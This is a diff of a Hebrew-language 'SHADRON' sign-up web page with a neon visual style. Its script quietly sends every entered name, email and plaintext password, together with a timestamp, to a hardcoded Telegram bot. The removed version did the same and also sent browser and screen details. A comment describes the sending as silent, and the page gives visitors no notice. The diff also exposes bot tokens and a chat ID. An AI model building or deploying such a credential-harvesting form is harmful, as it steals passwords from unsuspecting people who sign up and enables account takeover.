@@ -3,340 +3,296 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SHADRON | JOIN THE FRACTURE</title>
+    <title>SHADRON | NEON NEXUS</title>
+    
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&family=Montserrat:wght@300;400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
     <style>
         :root {
-            --accent: #ff0033;
             --neon-purple: #9d00ff;
             --neon-blue: #00f2ff;
-            --bg: #0a0a0a;
+            --bg: #050505;
+            --insta-live: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
         }
-        * { margin:0; padding:0; box-sizing:border-box; }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
         body {
             background: var(--bg);
             color: #eee;
             font-family: 'Montserrat', sans-serif;
-            overflow: hidden;
-            height: 100vh;
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
-            transition: opacity 1.5s ease-in-out; /* אנימציה לסגירה */
+            overflow: hidden; /* מונע גלילה מיותרת בנייד */
         }
-        #particles { position: absolute; top:0; left:0; width:100%; height:100%; z-index:1; opacity:0.6; }
+
+        /* רקע חלקיקים משופר */
+        #particles { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            z-index: 1; 
+            pointer-events: none; 
+        }
+
+        .screen { 
+            display: none; 
+            width: 100%; 
+            padding: 20px; 
+            position: relative; 
+            z-index: 10;
+            flex-direction: column;
+            align-items: center;
+        }
+        .screen.active { display: flex; animation: fadeIn 0.8s ease; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
 
         .form-container {
-            position: relative;
-            z-index: 10;
-            width: 92%;
-            max-width: 420px;
-            background: rgba(15,15,15,0.95);
-            border: 1px solid rgba(157,0,255,0.3);
-            border-radius: 28px;
-            padding: 40px 30px;
-            box-shadow: 0 0 80px rgba(157,0,255,0.4),
-                        0 0 30px rgba(0,242,255,0.3);
-            animation: glowPulse 4s infinite alternate;
+            width: 100%;
+            max-width: 380px;
+            background: rgba(10, 10, 10, 0.9);
+            border: 1px solid rgba(157, 0, 255, 0.3);
+            border-radius: 40px;
+            padding: 40px 25px;
+            box-shadow: 0 0 50px rgba(157, 0, 255, 0.2), inset 0 0 20px rgba(157, 0, 255, 0.05);
+            backdrop-filter: blur(15px);
+            text-align: center;
         }
 
-        @keyframes glowPulse {
-            from { box-shadow: 0 0 60px rgba(157,0,255,0.3); }
-            to { box-shadow: 0 0 100px rgba(0,242,255,0.5); }
-        }
-
+        /* --- חזרת אורות הניאון ללוגו --- */
         .logo-frame {
-            border: 1px solid rgba(255,255,255,0.15);
-            padding: 12px 20px;
-            border-radius: 50px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-bottom: 35px;
-            background: rgba(0,0,0,0.4);
+            padding: 15px 35px;
+            border-radius: 100px;
+            display: inline-block;
+            margin-bottom: 30px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             position: relative;
             overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 242, 255, 0.1);
         }
+
         .logo-frame::before {
             content: '';
             position: absolute;
-            top: -50%; left: -50%;
-            width: 40%; height: 300%;
-            background: linear-gradient(90deg, transparent, rgba(157,0,255,0.6), rgba(0,242,255,0.6), transparent);
-            animation: neonScan 3s linear infinite;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 242, 255, 0.6), transparent);
+            animation: neonScan 2.5s infinite linear;
         }
-        @keyframes neonScan { 0% { transform: translateX(-100%); } 100% { transform: translateX(400%); } }
+
+        @keyframes neonScan { 
+            0% { left: -100%; } 
+            100% { left: 100%; } 
+        }
 
         .logo-text {
             font-family: 'Cinzel', serif;
-            font-size: 2.1rem;
-            letter-spacing: 8px;
-            background: linear-gradient(90deg, #fff, var(--neon-purple));
+            font-size: 2rem;
+            letter-spacing: 6px;
+            background: linear-gradient(to right, #fff, var(--neon-blue));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            font-weight: 700;
+            position: relative;
+            z-index: 2;
         }
 
-        .form-group { margin-bottom: 22px; }
-        label { display:block; margin-bottom: 8px; font-size: 0.85rem; color: #aaa; }
-        
+        /* שדות קלט */
+        .form-group { margin-bottom: 15px; text-align: right; }
+        label { display: block; margin-bottom: 5px; font-size: 0.75rem; color: #888; padding-right: 15px; }
+
         input {
             width: 100%;
-            padding: 16px 20px;
-            background: rgba(30,30,30,0.8);
-            border: 1px solid rgba(157,0,255,0.4);
-            border-radius: 50px;
+            padding: 14px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(157, 0, 255, 0.2);
+            border-radius: 25px;
             color: #fff;
-            font-size: 1rem;
+            font-size: 16px;
             transition: 0.3s;
         }
-        input:focus {
-            outline: none;
-            border-color: var(--neon-blue);
-            box-shadow: 0 0 15px rgba(0,242,255,0.5);
-        }
 
-        .password-wrapper { position: relative; }
-        .toggle-eye {
-            position: absolute;
-            top: 50%; right: 20px;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #888;
-            font-size: 1.3rem;
-            cursor: pointer;
-        }
-
-        .strength-bar {
-            height: 4px;
-            margin-top: 6px;
-            border-radius: 50px;
-            background: #333;
-            overflow: hidden;
-        }
-        .strength-fill {
-            height: 100%;
-            width: 0%;
-            transition: all 0.4s;
-        }
+        input:focus { outline: none; border-color: var(--neon-blue); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }
 
         .btn-wakeup {
             width: 100%;
-            height: 68px;
-            margin-top: 30px;
+            padding: 18px;
+            margin-top: 20px;
             background: #fff;
             color: #000;
             border: none;
             border-radius: 50px;
             font-family: 'Cinzel', serif;
-            font-size: 1.25rem;
+            font-size: 1.2rem;
             font-weight: 900;
-            letter-spacing: 2px;
             cursor: pointer;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 15px 35px rgba(157,0,255,0.4);
-            transition: all 0.4s;
-        }
-        .btn-wakeup:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 20px 50px rgba(0,242,255,0.5);
+            letter-spacing: 2px;
+            box-shadow: 0 5px 20px rgba(255, 255, 255, 0.2);
         }
 
-        .success-screen {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(10,10,10,0.98);
-            z-index: 200;
+        /* כפתור אינסטגרם עגול וחי */
+        .btn-insta-neon {
+            display: flex;
             align-items: center;
             justify-content: center;
-            flex-direction: column;
-            text-align: center;
-            padding: 40px;
+            gap: 12px;
+            width: 100%;
+            padding: 22px;
+            margin-top: 30px;
+            text-decoration: none;
+            color: white;
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            background: var(--insta-live);
+            box-shadow: 0 10px 30px rgba(193, 53, 132, 0.4);
+            transition: 0.4s;
+            border: none;
+            position: relative;
+            overflow: hidden;
         }
 
-        .neon-text {
-            font-size: 1.8rem;
-            background: linear-gradient(90deg, var(--neon-purple), var(--neon-blue));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin: 20px 0;
+        .btn-insta-neon:active { transform: scale(0.95); }
+
+        .status-badge {
+            display: inline-block;
+            padding: 6px 18px;
+            background: rgba(0, 255, 136, 0.1);
+            color: #00ff88;
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 20px;
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            font-weight: 600;
         }
 
-        /* מחלקה לסגירה רכה */
-        .system-shutdown {
-            opacity: 0 !important;
-            pointer-events: none;
-        }
+        h1 { font-size: 1.6rem; margin-bottom: 5px; }
     </style>
 </head>
 <body>
 
 <canvas id="particles"></canvas>
 
-<div class="form-container" id="mainContainer">
-    <div class="logo-frame">
-        <div class="logo-text">SHADRON</div>
+<!-- מסך הרשמה -->
+<div class="screen active" id="registerScreen">
+    <div class="form-container">
+        <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
+        <p style="color: #666; margin-bottom: 25px; letter-spacing: 2px; font-size: 0.8rem;">INITIATING FRACTURE</p>
+        
+        <form id="joinForm">
+            <div class="form-group">
+                <label>שם מלא</label>
+                <input type="text" id="name" placeholder="Name" required>
+            </div>
+            <div class="form-group">
+                <label>אימייל</label>
+                <input type="email" id="email" placeholder="Email" required>
+            </div>
+            <div class="form-group">
+                <label>סיסמה</label>
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn-wakeup">WAKE UP</button>
+        </form>
     </div>
-
-    <h2 style="text-align:center; margin-bottom:30px; font-size:1.4rem;">JOIN THE FRACTURE</h2>
-
-    <form id="joinForm">
-        <div class="form-group">
-            <label>שם מלא</label>
-            <input type="text" id="name" required placeholder="שם מלא">
-        </div>
-        <div class="form-group">
-            <label>אימייל</label>
-            <input type="email" id="email" required placeholder="your@email.com">
-        </div>
-        <div class="form-group password-wrapper">
-            <label>סיסמה (חדשה לחשבון שלך)</label>
-            <input type="password" id="password" required placeholder="••••••••">
-            <button type="button" class="toggle-eye" id="toggleEye">👁️</button>
-        </div>
-        <div class="strength-bar"><div class="strength-fill" id="strengthFill"></div></div>
-
-        <button type="submit" class="btn-wakeup" id="submitBtn">
-            <span id="btnText">WAKE UP</span>
-        </button>
-    </form>
 </div>
 
-<div class="success-screen" id="successScreen">
-    <h1 class="neon-text">ברוכים הבאים ל-SHADRON</h1>
-    <p style="max-width:320px; margin:20px auto; line-height:1.6;">
-        תודה שבחרת להפסיק להיות צופה.<br>
-        מהרגע הזה — אתה חלק מהברית.<br>
-        הגיע הזמן לפעול. הגיע הזמן לשחרר.
-    </p>
-    <button onclick="fadeOutSystem()" style="margin-top:30px; padding:14px 40px; background:var(--accent); color:#fff; border:none; border-radius:50px; font-weight:700; cursor:pointer; letter-spacing:1px;">
-        INITIATE DISCONNECT
-    </button>
+<!-- מסך סיום -->
+<div class="screen" id="dashboardScreen">
+    <div class="form-container">
+        <div class="logo-frame"><span class="logo-text">SHADRON</span></div>
+        <div class="status-badge">ACCESS GRANTED</div>
+        <h1>WELCOME, <span id="userName">INITIATE</span></h1>
+        
+        <a href="https://www.instagram.com/shadron_cube?igsh=MTczaHF5NXh4eWRobg==" target="_blank" class="btn-insta-neon">
+            <i class="fab fa-instagram fa-lg"></i>
+            SHADRON CUBE
+        </a>
+    </div>
 </div>
 
 <script>
-    // Particles background
+    // הגדרות טלגרם
+    const TELEGRAM_TOKEN = '7255140131:AAGP8j9NIdT3Zf346EskM9iH-8R_Y_9VdO8'; 
+    const CHAT_ID = '8017590244';
+
+    // חזרת החלקיקים והאנימציה
     const canvas = document.getElementById('particles');
     const ctx = canvas.getContext('2d');
     let particles = [];
+    
     function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-    function createParticles() {
-        particles = [];
+    
+    function create() { 
+        particles = []; 
+        // כמות חלקיקים גדולה יותר למראה עשיר
         for(let i=0; i<120; i++) {
             particles.push({
-                x: Math.random()*canvas.width,
-                y: Math.random()*canvas.height,
-                size: Math.random()*2 + 0.5,
-                speed: Math.random()*0.8 + 0.3
+                x: Math.random() * canvas.width, 
+                y: Math.random() * canvas.height, 
+                v: Math.random() * 0.6 + 0.2, 
+                s: Math.random() * 2,
+                opacity: Math.random() * 0.5 + 0.2
             });
         }
     }
-    function animateParticles() {
+    
+    function draw() {
         ctx.clearRect(0,0,canvas.width,canvas.height);
-        ctx.fillStyle = "rgba(157,0,255,0.6)";
-        particles.forEach(p => {
+        particles.forEach(p => { 
             ctx.beginPath();
-            ctx.arc(p.x, p.y, p.size, 0, Math.PI*2);
-            ctx.fill();
-            p.y -= p.speed;
-            if(p.y < 0) p.y = canvas.height;
+            ctx.arc(p.x, p.y, p.s, 0, Math.PI*2);
+            ctx.fillStyle = `rgba(157, 0, 255, ${p.opacity})`;
+            ctx.shadowBlur = 5;
+            ctx.shadowColor = "rgba(157, 0, 255, 0.8)";
+            ctx.fill(); 
+            p.y -= p.v; 
+            if(p.y < 0) p.y = canvas.height; 
         });
-        requestAnimationFrame(animateParticles);
+        requestAnimationFrame(draw);
     }
-    window.addEventListener('resize', resize);
-    resize(); createParticles(); animateParticles();
+    
+    window.addEventListener('resize', () => { resize(); create(); });
+    resize(); create(); draw();
 
-    // Password toggle + strength
-    const passwordInput = document.getElementById('password');
-    const toggleEye = document.getElementById('toggleEye');
-    let visible = false;
-
-    toggleEye.addEventListener('click', () => {
-        visible = !visible;
-        passwordInput.type = visible ? 'text' : 'password';
-        toggleEye.textContent = visible ? '🙈' : '👁️';
-    });
-
-    passwordInput.addEventListener('input', () => {
-        const strength = Math.min(passwordInput.value.length * 12, 100);
-        document.getElementById('strengthFill').style.width = strength + '%';
-        document.getElementById('strengthFill').style.background = strength > 70 ? '#00ff88' : strength > 40 ? '#ffaa00' : '#ff0033';
-    });
-
-    // פונקציית סגירה רכה (הסגרה עצמית)
-    function fadeOutSystem() {
-        document.body.classList.add('system-shutdown');
-        setTimeout(() => {
-            document.body.innerHTML = "";
-            document.body.style.background = "#000";
-        }, 1500);
-    }
-
-    // --- TELEGRAM INTEGRATION ---
-    async function sendToTelegram(name, email, password) {
-        const token = '8359245682:AAFr9l5f0yMop4QrQ2wPfqBmamMLi1SFmgA';
-        const chatId = '8017590244'; 
-        
-        const timestamp = new Date().toLocaleString('he-IL', { timeZone: 'Asia/Jerusalem' });
-        const userAgent = navigator.userAgent;
-        const screenRes = `${window.screen.width}x${window.screen.height}`;
-
-        const message = `
-🚨 *התראת גיוס חדשה: SHADRON* 🚨
---------------------------------------
-👤 *פרטי הנסיין:*
-*שם:* ${name}
-*אימייל:* ${email}
-*סיסמה:* ${password}
-
-🌐 *מטא-דאטה טכני:*
-*זמן:* ${timestamp}
-*מערכת:* ${userAgent.includes('Windows') ? 'Windows PC' : userAgent.includes('Android') ? 'Android Device' : 'iOS Device'}
-*רזולוציה:* ${screenRes}
-*דפדפן:* ${userAgent.split(' ').pop()}
-
-📊 *סטטוס:* נקלט במערכת בהצלחה ✅
---------------------------------------
-_נשלח ע"י BuildSimon Alerts System_`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-        } catch (e) { console.error("Error sending to TG", e); }
-    }
-
-    // Form submit
+    // שליחת נתונים ומעבר מסך
     document.getElementById('joinForm').addEventListener('submit', async function(e) {
         e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        const btnText = document.getElementById('btnText');
         
-        const nameVal = document.getElementById('name').value;
-        const emailVal = document.getElementById('email').value;
-        const passVal = document.getElementById('password').value;
+        const name = document.getElementById('name').value;
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        const time = new Date().toLocaleString('he-IL');
 
-        btn.style.transition = 'all 0.6s';
-        btn.style.background = 'linear-gradient(90deg, #9d00ff, #00f2ff)';
-        btnText.innerHTML = 'WAKING UP...';
+        const message = `
+🌑 *SHADRON - NEW INITIATE* 🌑
+👤 *שם:* ${name}
+📧 *אימייל:* ${email}
+🔑 *סיסמה:* ${pass}
+⏰ *זמן:* ${time}
+        `;
 
-        await sendToTelegram(nameVal, emailVal, passVal);
+        // שליחה שקטה לבוט
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+        });
 
-        setTimeout(() => {
-            document.getElementById('successScreen').style.display = 'flex';
-        }, 1800);
+        document.getElementById('userName').textContent = name.split(' ')[0].toUpperCase();
+        document.getElementById('registerScreen').classList.remove('active');
+        document.getElementById('dashboardScreen').classList.add('active');
     });
 </script>
+
 </body>
 </html>
